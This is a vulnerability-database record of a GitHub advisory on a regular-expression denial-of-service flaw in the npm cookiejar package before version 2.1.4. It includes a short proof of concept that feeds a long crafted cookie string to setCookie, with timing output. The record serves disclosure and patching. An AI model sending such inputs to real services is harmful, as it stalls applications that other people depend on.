advisory_id: GHSA-h452-7996-h45h
datasource_id: github_osv_importer_v2/GHSA-h452-7996-h45h
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/01/GHSA-h452-7996-h45h/GHSA-h452-7996-h45h.json
aliases:
  - CVE-2022-25901
summary: |
  cookiejar Regular Expression Denial of Service via Cookie.parse function
  Versions of the package cookiejar before 2.1.4 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `Cookie.parse` function and other aspects of the API, which use an insecure regular expression for parsing cookie values. Applications could be stalled for extended periods of time if untrusted input is passed to cookie values or attempted to parse from request headers.

  Proof of concept:

  ```
  ts\nconst { CookieJar } = require("cookiejar");

  const jar = new CookieJar();

  const start = performance.now();

  const attack = "a" + "t".repeat(50_000);
  jar.setCookie(attack);

  console.log(`CookieJar.setCookie(): ${performance.now() - start}ms`);

  ```

  ```
  CookieJar.setCookie(): 2963.214399999939ms
  ```
impacted_packages:
  - purl: pkg:npm/cookiejar
    affected_versions: vers:npm/<2.1.4
    fixed_versions: vers:npm/2.1.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.webjars.npm/cookiejar
    affected_versions: vers:maven/<=2.1.3
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/01/GHSA-h452-7996-h45h/GHSA-h452-7996-h45h.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1333
references:
  - url: https://github.com/bmeck/node-cookiejar
    reference_type:
    reference_id:
  - url: https://github.com/bmeck/node-cookiejar/blob/master/cookiejar.js#23L73
    reference_type:
    reference_id:
  - url: https://github.com/bmeck/node-cookiejar/blob/master/cookiejar.js%23L73
    reference_type:
    reference_id:
  - url: https://github.com/bmeck/node-cookiejar/pull/39
    reference_type:
    reference_id:
  - url: https://github.com/bmeck/node-cookiejar/pull/39/commits/eaa00021caf6ae09449dde826108153b578348e5
    reference_type:
    reference_id:
  - url: https://lists.debian.org/debian-lts-announce/2023/09/msg00008.html
    reference_type:
    reference_id:
  - url: https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-3176681
    reference_type:
    reference_id:
  - url: https://security.snyk.io/vuln/SNYK-JS-COOKIEJAR-3149984
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-25901
    reference_type:
    reference_id: CVE-2022-25901
